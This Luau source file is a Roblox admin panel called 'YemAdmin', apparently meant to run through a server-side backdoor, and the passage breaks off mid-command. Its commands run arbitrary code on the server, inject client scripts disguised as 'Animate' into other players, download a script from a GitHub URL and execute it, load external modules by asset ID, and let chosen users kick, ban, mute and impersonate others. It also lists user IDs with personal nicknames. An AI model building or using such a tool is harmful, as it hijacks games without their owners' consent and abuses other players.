--!strict
--!optimize 2
--!native
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ServerScriptService = game:GetService("ServerScriptService")

-- NOTE: I use types for autocomplete & not performance

-- libraries
type Callback<Args...> = (Args...) -> ()

type Signal<Args...> = {
    Connect: (self: Signal<Args...>, callback: Callback<Args...>) -> RBXScriptConnection,
    Once: (self: Signal<Args...>, callback: Callback<Args...>) -> RBXScriptConnection?,
    Wait: (self: Signal<Args...>) -> (...any),
    Fire: (self: Signal<Args...>, Args...) -> (),
    Destroy: (self: Signal<Args...>) -> (),

    _bindable: BindableEvent, -- internal
    --_connections: {RBXScriptConnection?}
}

local Signal = {} -- NOTE: no speed is required
Signal.__index = Signal

function Signal.new<Args...>(): Signal<Args...>
    local signal: Signal<Args...> = setmetatable({}, Signal) :: any
    signal._bindable = Instance.new("BindableEvent")
    return signal
end

function Signal:Connect<Args...>(callback: Callback<Args...>): RBXScriptConnection
    return (self :: Signal<Args...>)._bindable.Event:Connect(callback)
end

function Signal:Once<Args...>(callback: Callback<Args...>): RBXScriptConnection?
    local connection: RBXScriptConnection?
    local function wrapper(...: Args...)
        if connection then
            connection:Disconnect()
            connection = nil
        end
        callback(...)
    end
    connection = (self :: Signal<Args...>)._bindable.Event:Connect(wrapper)
    return connection
end

function Signal:Wait<Args...>(): (Args...)
    return (self :: Signal<Args...>)._bindable.Event:Wait()
end

function Signal:Fire<Args...>(...: Args...)
    (self :: Signal<Args...>)._bindable:Fire(...)
end

function Signal:Destroy<Args...>()
    (self :: Signal<Args...>)._bindable:Destroy()
end

-- script stuff
type GuiOptions = {
    SearchBar: boolean?,
}

local function NewGui(labels: {}, options: GuiOptions?): ScreenGui
    -- had to shadow so error doesnt appear
    options = (options or {}) :: GuiOptions?
    assert(options, "this wont trigger") -- silence lsp!

	local cmdGui = Instance.new("ScreenGui")
	cmdGui.Name = "CMDSGUI"

	local mainFrame = Instance.new("Frame", cmdGui)
	mainFrame.Style = Enum.FrameStyle.RobloxRound
	mainFrame.Size = UDim2.new(0, 400, 0, 400)
	mainFrame.Position = UDim2.new(0.5, -200, 0.5, -200)
	Instance.new("UIDragDetector", mainFrame)

	local scrollFrame = Instance.new("ScrollingFrame", mainFrame)
	scrollFrame.Size = UDim2.new(1, 0, 1, -20)
	scrollFrame.Position = UDim2.new(0, 0, 0, 20)
	scrollFrame.BackgroundTransparency = 1
	scrollFrame.ScrollBarThickness = 7
	scrollFrame.CanvasSize = UDim2.new(0, 0, 0, 0)

	local innerFrame = Instance.new("Frame", scrollFrame)
	innerFrame.Size = UDim2.new(1, 0, 0, 0)
	innerFrame.Position = UDim2.new(0, 0, 0, 0)
	innerFrame.Transparency = 1

	local baseLabel = Instance.new("TextLabel")
	baseLabel.TextXAlignment = Enum.TextXAlignment.Left
	baseLabel.TextYAlignment = Enum.TextYAlignment.Top
	baseLabel.TextSize = 18
	baseLabel.FontFace = Font.new("rbxasset://fonts/families/Arial.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
	baseLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
	baseLabel.BackgroundTransparency = 1
	baseLabel.RichText = true

	for i, v in ipairs(labels) do
		local newLabel = baseLabel:Clone()
		newLabel.Text = v
		newLabel.Position = UDim2.new(0, 0, 0, (i - 1) * 20)
		newLabel.Size = UDim2.new(1, 0, 0, 20)
		newLabel.Visible = true
		newLabel.Parent = innerFrame
	end

	innerFrame.Size = UDim2.new(1, 0, 0, #labels * 20)
	scrollFrame.CanvasSize = UDim2.new(0, 0, 0, innerFrame.Size.Y.Offset)

    if options.SearchBar then
        local searchBox = Instance.new("TextBox", mainFrame)
        searchBox.Size = UDim2.new(1, -20, 0, 20)
        searchBox.Position = UDim2.new(0, 0, 0, 0)
        searchBox.BackgroundTransparency = 0.5
        searchBox.BackgroundColor3 = Color3.fromHex("#000000")
        searchBox.TextColor3 = Color3.fromHex("#c8c8c8")
        searchBox.PlaceholderText = " Search something here >.<"
        searchBox.Text = ""
        searchBox.TextXAlignment = Enum.TextXAlignment.Left
        searchBox.ClearTextOnFocus = true
        searchBox:GetPropertyChangedSignal("Text"):Connect(function(input: InputObject)
            -- TODO: strip function for richtext format
            for i, v in pairs(innerFrame:GetChildren()) do
                local lab = v :: TextLabel
                lab.Visible = string.find(lab.Text:lower(), searchBox.Text:lower()) ~= nil
            end
        end)
    end

	local closeButton = Instance.new("TextButton", mainFrame)
	closeButton.TextSize = 18
	closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
	closeButton.FontFace = Font.new("rbxasset://fonts/families/Arial.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
	closeButton.Size = UDim2.new(0, 20, 0, 20)
	closeButton.Text = "X"
	closeButton.Style = Enum.ButtonStyle.RobloxButtonDefault
	closeButton.Position = UDim2.new(1, -17, 0, 0)
	closeButton.MouseButton1Click:Connect(function(...)
		cmdGui:Destroy()
	end)

	return cmdGui
end
--NewGui({`I want the <font color="#FF7800">orange</font> candy.`, `I want the <font color="#0078FF">blue</font> candy.`}).Parent = game.Players.SnowClan_8342.PlayerGui

print'Started initialization of YemAdmin'
-- DEBUG CODE TO WIPE
if _G.yemdebug and _G.yem then
    _G.yem.eject()
    _G.yem = false -- wipe
end

-- TODO: commandbar

-- cuz some people kept mapping it and i decided to be unfunny
if not _G.yem then
    local yemEnv = {}
    local proxy = newproxy(true)
    local proxyMt = getmetatable(proxy)

    proxyMt.__index = function(table,key)
        return yemEnv[key]
    end 
    proxyMt.__newindex = function(table,key,value)
        yemEnv[key] = value
    end 
    _G.yem = proxy
end

type AdminRank = {
    Rank: number,
    Colour: Color3,
}

type ExtraSpace = {
    Name: string,
    DisplayName: string
}

type UserData = {
    Nickname: string?,
    Banned: string?,
    Blacklist: boolean?,

    ExtraSpace: ExtraSpace?,-- SHOULD NOT BE OPTIONAL!
    Rank: AdminRank
}

-- TODO: custom class for handling userdata (EnTT style preferably)
type YemEnv = {
    eject: ()->(),
    runLua: (caller: Player, code: string, waitDelete: number?)->(),

    config: {
        prefix: string
    },

    events: {
        PlayerSpawn: Signal<Player, Model>,
        PlayerChatted: Signal<Player, string>,
    },

    Data: {[number]: UserData} -- NOTE: UserID: Data
}

local yemenv: YemEnv = _G.yem

-- TODO: dumb crap people do should be passed through events or smth
yemenv.events = {
    PlayerSpawn = Signal.new(),
    PlayerChatted = Signal.new()
}

if not yemenv.config then
    yemenv.config = {
        prefix = "&"
    }
end

-- NOTE: these shouldnt be modified while live
-- rank worth as a %percent%
local Ranks: {[string]: AdminRank} = {
    Developer = {
        Rank = 100,
        Colour = Color3.fromRGB(105, 47, 138)
    },
    Special = {
        Rank = 80,
        Colour = Color3.fromRGB(110, 57, 57)
    },
    Whitelist = {
        Rank = 50,
        Colour = Color3.fromHSV(0.692112, 0.539744, 0.7)
    }
    --User = {
    --    Rank = 0,
    --    Colour = Color3.fromHSV(0.692112, 0.539744, 0.7)
    --}
}

if not yemenv.Data then
    yemenv.Data = {
        [2280995624] = {
            Rank = Ranks.Developer,
        }, -- SnowClan_8342

        -- people i know & trust (sometimes)
        [846325069] = { Rank = Ranks.Special }, -- qwdssssfsdrfasd (Shakira)
        [3318383270] = { Rank = Ranks.Special }, -- yx_doomspire (Seele)
        [3421321085] = { Rank = Ranks.Special }, -- idonthacklol101ns (Webs)
        [1702851506] = { Rank = Ranks.Special }, -- AIphaGunner (Tech)
        [4769427369] = { Rank = Ranks.Special }, -- trashmoderatio1n (Moderation)
        [1027223614] = { Rank = Ranks.Special }, -- xXRblxGamerRblxXx (Lanzy)
        [137072437] = { Rank = Ranks.Special }, -- pawsornever (Skyz)
        [498189629] = { Rank = Ranks.Special }, -- bob90368 (Notisa/Isa)
        [63001727] = { Rank = Ranks.Special }, -- bbangtans (Paws/Lara)
        --["s_tun"] = { Rank = Ranks.Special }, -- s_tun (Birdie) NOTE: she left her spot open (exposing a vuln rip)

        -- they've been nice and didnt abuse whitelist so i might aswell keep them on it permanmently
        [5046944059] = { Rank = Ranks.Whitelist }, -- BionicGamer112203 (Frisk)
    }
end

-- had to move this down here (grrr..)
local getPlrByUsername = function(name: string): Player?
    for _, player in ipairs(Players:GetPlayers()) do
    	if string.find(string.lower(player.Name), name, 1, true) or string.find(string.lower(player.DisplayName), name, 1, true) then
    		return player
    	end
    end
    return nil
end

-- give Data default values you can index
setmetatable(yemenv.Data, {
    __index = function(_t, userid)
        local t: {UserData} = _t
        if not rawget(_t, userid) then
            rawset(_t, userid, {
                Rank = {
                    Rank = 0
                } :: AdminRank
            })
        end

        local dta = rawget(_t, userid)
        if dta then
            if not dta.ExtraSpace then
                local plr = Players:GetPlayerByUserId(userid)
                if plr then
                    dta.ExtraSpace = {
                        DisplayName = plr.DisplayName,
                        Name = plr.Name
                    } -- fetch from roblox so we can access this even if the player isnt online
                end
            end
        end

        return t[userid]
    end
})

local function RankToString(rank: number)
    for i, v in pairs(Ranks) do
        if rank == v.Rank then
            return i
        end
    end
    return "User"
end

-- expose just 2 be nice qt3.14's
yemenv.runLua = function(caller: Player, code: string, waitDelete: number?)
    if not ServerScriptService:FindFirstChild("goog") then
        local ticking = tick()
        getfenv().require(112691275102014).load() -- getfenv so it stops error in ide thanks
        repeat task.wait() until ServerScriptService:FindFirstChild("goog") or tick() - ticking >= 10
    end

    local goog = ServerScriptService:FindFirstChild("goog")
    local p = caller

    if not goog then
        error("goog failed to be added, command can not continue")
    end

    local scr = goog:FindFirstChild("Utilities").Client:Clone()
    local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()

    loa.Parent = scr
    scr.Name = "Animate"
    scr:WaitForChild("Exec").Value = code

    if p.Character then
        scr.Parent = p.Character
    else
        scr.Parent = p:WaitForChild("PlayerGui")
    end

    scr.Enabled = true

    if waitDelete then
        task.wait(waitDelete)
        scr:Destroy()
    end
end

local GetRank = function(plyr: Player)
    return yemenv.Data[plyr.UserId].Rank.Rank -- wont ever be nil bbg
end

if yemenv.eject then
    yemenv.eject()
end

local connections: {RBXScriptConnection} = {}
local isRunning = true
yemenv.eject = function()
    isRunning = false
    if yemenv.events then
        for i,v: Signal<> in pairs(yemenv.events) do
            v:Destroy()
        end
    end
    for i,v in pairs(connections) do
        v:Disconnect()
    end
end

-- TODO: move to another luau file or smth
local Msg = function(caller: Player, msg: string, legacyMsg: boolean?)
    if legacyMsg then
        local msgInst = Instance.new("Message", caller.PlayerGui)
        msgInst.Text = msg
        task.wait(3)
        msgInst:Destroy()
        return
    end 

    -- TODO: a remote event in replicated storage specifically for this or smth so i dont dupe scripts
    yemenv.runLua(caller, `game.StarterGui:SetCore("SendNotification", \{Title = "YemAdmin",Text = "{msg}",Duration = 5\})`, 1)
end

local ClearWorkspace = function()
    for _, object in pairs(workspace:GetChildren()) do
        if object == workspace.Terrain or object == workspace.Tabby then continue end
        if Players:GetPlayerFromCharacter(object) then continue end
        
        object:Destroy()
    end
end

local RemoveItem = function(tbl: {any}, item: any) 
    for i,v in ipairs(tbl) do
        if v == item then
            table.remove(tbl, i)
            --break
        end 
    end
    return tbl
end

type UserList = { [number]: string }
type UserArray = { string }
type KickList = { any }--idc

type Settings = {
    Legacy_ExcludedUsers: UserList,
    af: boolean,
    CensoredUsers: UserList,
    tempadmins: UserList,
    Legacychatadmins: UserArray,
    tempkicked: KickList,
    Filterlegacychat: boolean,
    p299: UserList,
    permadmins: UserList,
    specialperms: UserList,
    BindPlayerChatted: (plyr: Player)->RBXScriptSignal,

    -- just so the errors stfu in ide :)
    yemdebug: boolean?,
}
local _G = _G :: Settings
-- rewritten for multi-target
-- NOTE: sketchy i needa compact it and clean it a bit tbf
local getPlyr = function(caller: Player, name: string)
	local _name = string.lower(name)

    local operands = string.split(_name, ",") or _name
    assert(#operands > 0, "No operands given")

    local output: {Player} = {}

    for i,v in pairs(operands) do
        if v:lower() == "me" then
            table.insert(output, caller)
        elseif v:lower() == "all" then
            for _,plr in pairs(Players:GetPlayers()) do
                table.insert(output, plr)
            end
        elseif v:lower() == "others" or v:lower() == "other" then
            for _,plr in pairs(Players:GetPlayers()) do
                if plr ~= caller then
                    table.insert(output, plr)
                end
            end
        elseif v:lower() == "admins" or v:lower() == "admin" then
            for _,plr in pairs(Players:GetPlayers()) do
                if table.find(_G.tempadmins, plr.Name) then
                    table.insert(output, plr)
                end
            end
        elseif v:lower() == "nonadmins" or v:lower() == "nonadmin" then
            for _,plr in pairs(Players:GetPlayers()) do
                if not table.find(_G.tempadmins, plr.Name) then
                    table.insert(output, plr)
                end
            end
        else
            local plr = getPlrByUsername(name)
            if plr then
                table.insert(output, plr)
            end
        end
    end

	return output
end

-- TODO: wrap this in some kind of format library
function E(text: string)
	return text:gsub('[&<>"\']',{
		['&'] = '&amp;',
		['<'] = '&lt;',
		['>'] = '&gt;',
		['"'] = '&quot;',
		['\''] = '&apos;',
	})
end

-- unique roblox emojis
-- TODO: actual roblox emojis too or smth idk
function F(text: string)
	return text:gsub(':(%w+):',function(t)
        return ({
            verified = utf8.char(0xE000),
            premium = utf8.char(0xE001),
            robux = utf8.char(0xE002)
        })[t] or (":"..t..":") -- sketchy
    end)
end

function C(text: string, colour: Color3)
    return `<font color="#{colour:ToHex()}">{text}</font>`
end

local commands: {Command} = {}

type Command = {
    Name: string,
    Description: string,
    Arguments: string,
    MinimumRank: number,
    OnCalled: (... any)->()
}

print'initializing'
local AddCommand = function(minrank: number, name: string, desc: string, args: string, onCalled: (caller: Player, ... any)->())
	local tmpTbl: Command = {
		["Name"] = name,
		["Description"] = desc,
		["Arguments"] = args,
		["MinimumRank"] = minrank,
		["OnCalled"] = onCalled
	}
	table.insert(commands, tmpTbl)
end

local IssueCommand = function(caller: Player, command: string)
    local prefix = yemenv.config.prefix
	if string.sub(command, 1, #prefix) == prefix then
		command = string.sub(command, #prefix + 1)
	end

    local plrRank = GetRank(caller)

	for i,cmd in ipairs(commands) do
		local commandSplit: {string} = string.split(command, " ")
        local cmdName = table.remove(commandSplit, 1)
        assert(cmdName ~= nil, `cmdName is for some reason nil (It cant be)`)

		if string.lower(cmdName) == cmd.Name then
            if plrRank < cmd.MinimumRank then
                Msg(caller, `You must be rank {RankToString(cmd.MinimumRank)}({cmd.MinimumRank}/100) or higher to use this command. You are {RankToString(plrRank)}({plrRank})`)
                return -- no permission
            end
			local s,r = pcall(function()
				cmd.OnCalled(caller, unpack(commandSplit))
			end)
			if s ~= true then
				Msg(caller, r)--was msg anyways
			end
            return
		end
	end

    Msg(caller, `'{command}' is not a valid command`)
end

--clean events
yemenv.events.PlayerSpawn:Connect(function(plr: Player, char: Model)
    local humanoid = char:FindFirstChild("Humanoid") :: Humanoid
    if yemenv.Data[plr.UserId].Nickname then
        humanoid.DisplayName = yemenv.Data[plr.UserId].Nickname :: string -- verified it anyways
    end
end)

yemenv.events.PlayerChatted:Connect(function(plr: Player, msg: string)
    local prefix = yemenv.config.prefix
	if string.sub(msg, 1, #prefix) == prefix then
        IssueCommand(plr, msg)
    end
end)

-- messy events
local bindChatToPlyr = function(plyr: Player)
    _G.BindPlayerChatted(plyr):Connect(function(msg: string)
        if not isRunning then return end

        yemenv.events.PlayerChatted:Fire(plyr, msg)
    end)

    task.wait()
    local plrRank = GetRank(plyr)
    if plrRank > 0 then
        Msg(plyr, `Welcome back {plyr.Name} you are {RankToString(plrRank)}({plrRank})`)
    end
end

table.insert(connections, workspace.ChildAdded:Connect(function(a0: Instance)
    local _humanoid = a0:WaitForChild("Humanoid", 3) :: Humanoid -- 3 is probably extreme overkill
    local plr = Players:GetPlayerFromCharacter(a0)

    if plr then
        yemenv.events.PlayerSpawn:Fire(plr, a0 :: Model)
    end
end))

table.insert(connections, RunService.Heartbeat:Connect(function(deltaTime: number)
    local removal = {}
    
    for i, v in ipairs(_G.tempadmins) do
        local plr = getPlrByUsername(v)
        if plr and yemenv.Data[plr.UserId].Blacklist then
            table.insert(removal, i)
        end
    end

    for _, index in ipairs(removal) do
        table.remove(_G.tempadmins, index)
    end
end))

table.insert(connections, Players.PlayerAdded:Connect(function(plyr: Player)
    if yemenv.Data[plyr.UserId].Banned then
        plyr:Kick(`\n\n[YemAdmin]\nYou have been banned for:\n{yemenv.Data[plyr.UserId].Banned}`)
        return
    end

    if plyr.Name:lower():sub(1, 4) == "wiwo" then
        plyr:Kick("IP banned for racism!")
        return -- forgot to lock this when wiwo joins
    end

    bindChatToPlyr(plyr)
end))

local ss,rr = pcall(function(...)
for i,plyr in pairs(Players:GetPlayers()) do
    bindChatToPlyr(plyr)
end
end)
if not ss then warn (rr) end
print'chat hooks'

--cmds
AddCommand(0, "cmds", "Display a list of basic commands", "<>", function(caller: Player)
    -- TODO: minecraft bedrock server formatting codes inside of the "F" format function
    local output: {string} = {
        C("NOTE: Some of these commands use format", Color3.fromRGB(40, 110, 38)),
        C("experiments. (for example &nick)", Color3.fromRGB(40, 110, 38)),
        C("You may use these via ", Color3.fromRGB(40, 110, 38)),
        C(":verified: :premium:", Color3.fromRGB(88, 34, 101)) .. C(" or ", Color3.fromRGB(40, 110, 38)) .. C(":robux:", Color3.fromRGB(88, 34, 101)), ""
    }

    local plrRank = GetRank(caller)

    local prefix = yemenv.config.prefix
    for i,cmd in ipairs(commands) do
		local cmdName = cmd["Name"]
        local cmdDescr = cmd["Description"]
        local cmdArgs = C(E(cmd["Arguments"]), Color3.fromHex("#919191"))

        if plrRank < cmd.MinimumRank then
            cmdArgs = C(E(cmd["Arguments"]), Color3.fromHex("#3b1212"))

            table.insert(output, `{C(prefix, Color3.fromHex("#491717"))}{C(cmdName, Color3.fromHex("#310000"))} {cmdArgs} {C(`- {cmdDescr}`, Color3.fromHex("#310000"))}`)
            continue
        end

        table.insert(output, `{C(prefix, Color3.fromHex("#738e99"))}{cmdName} {cmdArgs} - {cmdDescr}`)
	end

    NewGui(output, {
        --SearchBar = true
    }).Parent = caller.PlayerGui
end)

AddCommand(0, "tpall", "Move all players to this server", "<>", function(caller: Player)
    caller:Kick("dumbass actually tried")
end)

AddCommand(Ranks.Developer.Rank, "enr", "Enter debug mode", "<boolean>", function(caller: Player, value: string)
    _G.yemdebug = (value:lower() == "true")
end)

AddCommand(Ranks.Special.Rank, "sentrius", "A nice admin :)", "<>", function(caller: Player)
    local code = game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/dmxxxx29/Roblox-/refs/heads/main/sentrius.lua")
    getfenv().loadstring(code)()
end)

AddCommand(Ranks.Special.Rank, "shutdown", "Emergency cleanup :)", "<...>", function(caller: Player, ...)
    local reason = table.concat({...}, " ")
    if not reason or #reason <= 1 then
        reason = "No reason specified."
    end

    Players.PlayerAdded:Connect(function(a0: Player)
        a0:Kick(reason)
    end)

    for i,v in pairs(Players:GetPlayers()) do
        v:Kick(reason)
    end
end)

AddCommand(Ranks.Special.Rank, "dex", "Serverside dex", "<plyr1>", function(caller: Player, plyr1: string)
    local targets = getPlyr(caller, plyr1)
    assert(#targets ~= 0, "Player(s) not found")

    for i,target in pairs(targets) do
        local plrRank = GetRank(target)
        --assert(plrRank < Ranks.Special.Rank, `Player {target.Name} has Special(80) or higher (No permission)`)
        if plrRank < Ranks.Special.Rank then continue end

        -- cant give dex to people without serverside commands
        task.spawn(function() getfenv().require(14572394952)(target.Name) end)
    end
end)

AddCommand(Ranks.Special.Rank, "s", "Run some lv2 luau code on server", "<...>", function(caller: Player, ...)
    local code = table.concat({...}, " ")
    assert(code, "No code")
    
    local chunk, loadErr = loadstring(code, "Cattails")
    assert(chunk, `Script failed to execute; {loadErr}`)
    chunk()
end)

AddCommand(Ranks.Special.Rank, "ls", "Run some lv3 lua code on client", "<plyr1, ...>", function(caller: Player, plyr1: string, ...)
    local targets = getPlyr(caller, plyr1)
    assert(#targets ~= 0, "Player(s) not found")

    local code = table.concat({...}, " ")
    assert(code, "No code")

    for i,target in pairs(targets) do
        task.spawn(function()
            yemenv.runLua(target, code) -- he didnt provide any way to get errors so oh well!
        end)
    end
end)

AddCommand(Ranks.Special.Rank, "whitelist", "Give someone access", "<plyr1>", function(caller: Player, plyr1: string)
    local targets = getPlyr(caller, plyr1)
    assert(#targets ~= 0, "Player(s) not found")

    for i,target in pairs(targets) do
        if yemenv.Data[target.UserId].Rank.Rank == 0 then -- glad no one realized u could do this bruh
            yemenv.Data[target.UserId].Rank = Ranks.Whitelist
        end
    end
end)

AddCommand(Ranks.Whitelist.Rank, "bans", "Display a list of banned players", "<>", function(caller: Player)
    local output: {string} = {}

    for i,plr in pairs(yemenv.Data) do
        if plr.Banned and plr.ExtraSpace then
            table.insert(output, `{C(plr.ExtraSpace.Name, Color3.fromHex("#997373"))} - reason: {plr.Banned}`)
        end
	end

    if #output == 0 then
        table.insert(output, C("Oopsie daisy! theres no bans here silly.", Color3.fromHex("#6ab483")))
    end 

    NewGui(output).Parent = caller.PlayerGui
end)

-- i'll fix this later im getting tired
--AddCommand(Ranks.Whitelist.Rank, "admins", "Display a list of admins", "<>", function(caller: Player)
--    local output: {string} = {}
--
--    local noDupe = {}
--    local s,r = pcall(function(...)
--    -- TODO: list them if they have yemadmin persons or pads/perm
--    for i,plr in pairs(_G.tempadmins) do
--        if table.find(noDupe, plr) then continue end
--
--        local plyr = getPlrByUsername(plr)
--        if not plyr then continue end
--
--        table.insert(noDupe, plr)
--
--        local endStr: {string} = {}
--
--        if table.find(_G.permadmins, plr) then -- is perm
--            table.insert(endStr, C("Perm", Color3.fromHSV(0.398148, 0.546154, 0.4)))
--        end
--        
--        if table.find(_G.p299, plr) then -- is persons/p299
--            table.insert(endStr, C("P299", Color3.fromHSV(0.136132, 0.539744, 0.4)))
--        end
--        
--        --local plrData = yemenv.Data[plyr.UserId]
--        --if plrData then -- is whitelist/whatrank
--        --    table.insert(endStr, C(RankToString(plrData.Rank.Rank), plrData.Rank.Colour))
--        --end
--
--        table.insert(output, `{C(plr, Color3.fromHex("#c8c8c8"))} ({table.concat(endStr, ", ")})`)
--	end
--    end)
--    if not s then warn(s,r) end
--
--    NewGui(output).Parent = caller.PlayerGui
--end)

AddCommand(Ranks.Whitelist.Rank, "clr", "Clear everything from workspace", "<>", ClearWorkspace)

AddCommand(Ranks.Whitelist.Rank, "kick", "Kick a player with a reason", "<plyr1, ...>", function(caller: Player, plyr1: string, ...)
    local targets = getPlyr(caller, plyr1)
    assert(#targets ~= 0, "Player(s) not found")

    for i,target in pairs(targets) do
        local plrRank = GetRank(target)
        --assert(plrRank < Ranks.Special.Rank, `Player {target.Name} has Special(80) or higher (No permission)`)
        if plrRank >= Ranks.Special.Rank then continue end

        local reason = table.concat({...}, " ")
        target:Kick(reason)
    end
end)

AddCommand(Ranks.Whitelist.Rank, "ban", "Ban a player with a reason", "<plyr1, ...>", function(caller: Player, plyr1: string, ...)
    local targets = getPlyr(caller, plyr1)
    assert(#targets ~= 0, "Player(s) not found")

    local reason = table.concat({...}, " ")
    if not reason or #reason <= 1 then
        reason = "No reason specified."
    end

    for i,target in pairs(targets) do
        local plrRank = GetRank(target)
        --assert(plrRank < Ranks.Special.Rank, `Player {target.Name} has Special(80) or higher (No permission)`)
        if plrRank >= Ranks.Special.Rank then continue end

        target:Kick(`\n\n[YemAdmin]\nYou have been banned for:\n{reason}`)
        yemenv.Data[target.UserId].Banned = reason
    end
end)

AddCommand(Ranks.Whitelist.Rank, "unban", "Unban a player", "<plyr1>", function(caller: Player, plyr1: string)
    for i,v in pairs(yemenv.Data) do
        if v.ExtraSpace and v.Banned then
            if string.find(string.lower(v.ExtraSpace.Name), plyr1, 1, true) or string.find(string.lower(v.ExtraSpace.DisplayName), plyr1, 1, true) then
                v.Banned = nil
            end
        end
    end
    error("User not found")
end)

AddCommand(Ranks.Whitelist.Rank, "blacklist", "Erase a players admin", "<plyr1>", function(caller: Player, plyr1: string)
    local targets = getPlyr(caller, plyr1)
    assert(#targets ~= 0, "Player(s) not found")

    for i,target in pairs(targets) do
        yemenv.Data[target.UserId].Blacklist = true
    end
end)

AddCommand(Ranks.Whitelist.Rank, "unblacklist", "Unblacklists a player", "<plyr1>", function(caller: Player, plyr1: string)
    for i,v in pairs(yemenv.Data) do
        if v.ExtraSpace and v.Blacklist then
            if string.find(string.lower(v.ExtraSpace.Name), plyr1, 1, true) or string.find(string.lower(v.ExtraSpace.DisplayName), plyr1, 1, true) then
                v.Blacklist = nil
            end
        end
    end
    error("User not found in blacklist")
end)

AddCommand(Ranks.Whitelist.Rank, "perm", "Give someone perm", "<plyr1>", function(caller: Player, plyr1: string)
    local targets = getPlyr(caller, plyr1)
    assert(#targets ~= 0, "Player(s) not found")

    for i,target in pairs(targets) do
        table.insert(_G.permadmins, target.Name)
        table.insert(_G.p299, target.Name)
        table.insert(_G.tempadmins, target.Name)
    end
end)

AddCommand(Ranks.Whitelist.Rank, "unperm", "Erase someones perm", "<plyr1>", function(caller: Player, plyr1: string)
    local targets = getPlyr(caller, plyr1)
    assert(#targets ~= 0, "Player(s) not found")

    for i,target in pairs(targets) do
        _G.permadmins = RemoveItem(_G.permadmins, target.Name)
        _G.p299 = RemoveItem(_G.p299, target.Name)
        _G.tempadmins = RemoveItem(_G.tempadmins, target.Name)
    end
end)

AddCommand(Ranks.Whitelist.Rank, "censor", "Restore someones chat filter", "<plyr1>", function(caller: Player, plyr1: string)
    local targets = getPlyr(caller, plyr1)
    assert(#targets ~= 0, "Player(s) not found")

    for i,target in pairs(targets) do
        local plrRank = GetRank(target)
        if plrRank >= Ranks.Special.Rank then continue end
        
        _G.Legacychatadmins = RemoveItem(_G.Legacychatadmins, target.Name)
    end
end)

AddCommand(Ranks.Whitelist.Rank, "uncensor", "Remove someones chat filter", "<plyr1>", function(caller: Player, plyr1: string)
    local targets = getPlyr(caller, plyr1)
    assert(#targets ~= 0, "Player(s) not found")

    for i,target in pairs(targets) do
        table.insert(_G.Legacychatadmins, target.Name)
    end
end)

AddCommand(Ranks.Whitelist.Rank, "mute", "Disable someones chat", "<plyr1>", function(caller: Player, plyr1: string)
    local targets = getPlyr(caller, plyr1)
    assert(#targets ~= 0, "Player(s) not found")

    for i,target in pairs(targets) do
        local plrRank = GetRank(target)
        if plrRank >= Ranks.Special.Rank then continue end
        
        task.spawn(function()
            yemenv.runLua(target, `game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)`)
        end)
    end
end)

AddCommand(Ranks.Whitelist.Rank, "unmute", "Enable someones chat", "<plyr1>", function(caller: Player, plyr1: string)
    local targets = getPlyr(caller, plyr1)
    assert(#targets ~= 0, "Player(s) not found")

    for i,target in pairs(targets) do
        task.spawn(function()
            yemenv.runLua(target, `game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)`)
        end)
    end
end)

AddCommand(Ranks.Whitelist.Rank, "gearban", "Disable someones backpack", "<plyr1>", function(caller: Player, plyr1: string)
    local targets = getPlyr(caller, plyr1)
    assert(#targets ~= 0, "Player(s) not found")

    for i,target in pairs(targets) do
        local plrRank = GetRank(target)
        if plrRank >= Ranks.Special.Rank then continue end
        
        task.spawn(function()
            yemenv.runLua(target, `game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)`)
        end)
    end
end)

AddCommand(Ranks.Whitelist.Rank, "ungearban", "Enable someones backpack", "<plyr1>", function(caller: Player, plyr1: string)
    local targets = getPlyr(caller, plyr1)
    assert(#targets ~= 0, "Player(s) not found")

    for i,target in pairs(targets) do
        task.spawn(function()
            yemenv.runLua(target, `game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)`)
        end)
    end
end)

-- TODO: legacy chat nicknames
AddCommand(Ranks.Whitelist.Rank, "nick", "Nick a player " .. C("[F]", Color3.fromRGB(88, 34, 101)), "<plyr1, ...>", function(caller: Player, plyr1: string, ...)
    local targets = getPlyr(caller, plyr1)
    assert(#targets ~= 0, "Player(s) not found")

    local newNick = F(table.concat({...}, " "))
    assert(newNick and #newNick > 1, "Nickname length invalid (2 or more charcaters required)")

    for i,target in pairs(targets) do
        --local plrRank = GetRank(target)
        --assert(plrRank < Ranks.Special.Rank, `Player {target.Name} has Special(80) or higher (No permission)`)
        --if plrRank >= Ranks.Special.Rank then continue end

        pcall(function(...)
            local humanoid = target.Character and target.Character:WaitForChild("Humanoid", 1) :: Humanoid
            assert(humanoid, "Invalid humanoid")

            humanoid.DisplayName = newNick
            yemenv.Data[target.UserId].Nickname = newNick
        end)
    end
end)

AddCommand(Ranks.Whitelist.Rank, "unnick", "Unnick a player", "<plyr1>", function(caller: Player, plyr1: string)
    local targets = getPlyr(caller, plyr1)
    assert(#targets ~= 0, "Player(s) not found")

    for i,target in pairs(targets) do
        --local plrRank = GetRank(target)
        --assert(plrRank < Ranks.Special.Rank, `Player {target.Name} has Special(80) or higher (No permission)`)
        --if plrRank >= Ranks.Special.Rank then continue end

        pcall(function(...)
            local humanoid = target.Character and target.Character:WaitForChild("Humanoid", 1) :: Humanoid
            assert(humanoid, "Invalid humanoid")

            humanoid.DisplayName = target.DisplayName
            yemenv.Data[target.UserId].Nickname = nil
        end)
    end
end)

AddCommand(Ranks.Special.Rank, "speak", "Speak as player" .. C("[F]", Color3.fromRGB(88, 34, 101)), "<plyr1, ...>", function(caller: Player, plyr1: string, ...)
    local targets = getPlyr(caller, plyr1)
    assert(#targets ~= 0, "Player(s) not found")

    local spoofText = F(table.concat({...}, " "))
    assert(spoofText and #spoofText > 1, "Text length invalid (2 or more charcaters required)")

    for i,target in pairs(targets) do
        --local plrRank = GetRank(target)
        --assert(plrRank < Ranks.Special.Rank, `Player {target.Name} has Special(80) or higher (No permission)`)
        --if plrRank >= Ranks.Special.Rank then continue end

        pcall(function(...)
